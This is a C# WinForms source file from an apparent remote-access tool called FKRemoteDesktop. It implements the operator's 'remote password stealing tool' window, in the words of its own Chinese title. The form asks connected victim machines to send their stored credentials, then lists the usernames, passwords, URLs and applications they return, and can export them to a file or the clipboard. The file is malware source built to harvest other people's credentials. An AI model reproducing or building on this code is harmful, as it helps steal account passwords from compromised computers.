﻿using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Network;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class PasswordRecoveryForm : Form
    {
        private readonly Client[] _clients;
        private readonly PasswordRecoveryHandler _recoveryHandler;
        private readonly RecoveredAccount _noResultsFound = new RecoveredAccount()
        {
            KeyName = "N/A",
            Application = "N/A",
            Url = "N/A",
            Username = "N/A",
            Password = "N/A"
        };

        public PasswordRecoveryForm(Client[] clients)
        {
            _clients = clients;
            _recoveryHandler = new PasswordRecoveryHandler(clients);

            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _recoveryHandler.AccountsRecovered += AddPasswords;
            MessageHandler.Register(_recoveryHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_recoveryHandler);
            _recoveryHandler.AccountsRecovered -= AddPasswords;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void PasswordRecoveryForm_Load(object sender, System.EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("FK远控服务器端 - 远程密码窃取工具", _clients.Length);
            txtFormat.Text = ServerConfig.SaveFormat;
            RecoverPasswords();
        }

        private void PasswordRecoveryForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            ServerConfig.SaveFormat = txtFormat.Text;
            UnregisterMessageHandler();
        }

        private void RecoverPasswords()
        {
            clearAllToolStripMenuItem_Click(null, null);
            _recoveryHandler.BeginAccountRecovery();
        }

        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts)
        {
            try
            {
                if (accounts == null || accounts.Count == 0) // no accounts found
                {
                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
                    lvi.SubItems.Add(_noResultsFound.KeyName);  // KeyName
                    lvi.SubItems.Add(_noResultsFound.Username); // User
                    lvi.SubItems.Add(_noResultsFound.Password); // Pass
                    lvi.SubItems.Add(_noResultsFound.Url);      // URL

                    var lvg = GetGroupFromApplication(_noResultsFound.Application);
                    if (lvg == null)
                    {
                        lvg = new ListViewGroup
                        { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
                        lstPasswords.Groups.Add(lvg);
                    }
                    lvi.Group = lvg;
                    lstPasswords.Items.Add(lvi);
                    return;
                }

                var items = new List<ListViewItem>();
                foreach (var acc in accounts)
                {
                    var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
                    lvi.SubItems.Add(acc.KeyName);  // KeyName
                    lvi.SubItems.Add(acc.Username); // User
                    lvi.SubItems.Add(acc.Password); // Pass
                    lvi.SubItems.Add(acc.Url);      // URL

                    var lvg = GetGroupFromApplication(acc.Application);
                    if (lvg == null)
                    {
                        lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
                        lstPasswords.Groups.Add(lvg);
                    }
                    lvi.Group = lvg;
                    items.Add(lvi);
                }

                lstPasswords.Items.AddRange(items.ToArray());
                UpdateRecoveryCount();
            }
            catch {}
        }

        private void UpdateRecoveryCount()
        {
            groupBox1.Text = $"远程计算机密码信息列表 [ {lstPasswords.Items.Count} ]";
        }

        private string ConvertToFormat(string format, RecoveredAccount login)
        {
            return format
                .Replace("APP", login.Application)
                .Replace("URL", login.Url)
                .Replace("KEY", login.KeyName)
                .Replace("USER", login.Username)
                .Replace("PASS", login.Password);
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();
            string format = txtFormat.Text;
            if (selected)
            {
                foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }
            else
            {
                foreach (ListViewItem lvi in lstPasswords.Items)
                {
                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
                }
            }
            return sb;
        }

        private ListViewGroup GetGroupFromApplication(string app)
        {
            ListViewGroup lvg = null;
            foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
            {
                lvg = @group;
            }
            return lvg;
        }

        // 保存全部到文件中
        private void saveAllToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        // 保存选择项到文件中
        private void saveSelectedToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        // 复制全部到剪切板
        private void copyAllToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
        }

        // 复制选择项到剪切板
        private void copySelectedToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
        }

        // 清除全部
        private void clearAllToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            lstPasswords.Items.Clear();
            lstPasswords.Groups.Clear();
            UpdateRecoveryCount();
        }

        // 清除所选项
        private void clearSelectedToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
            {
                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
            }
        }

        // 刷新
        private void refreshToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            RecoverPasswords();
        }

    }
}
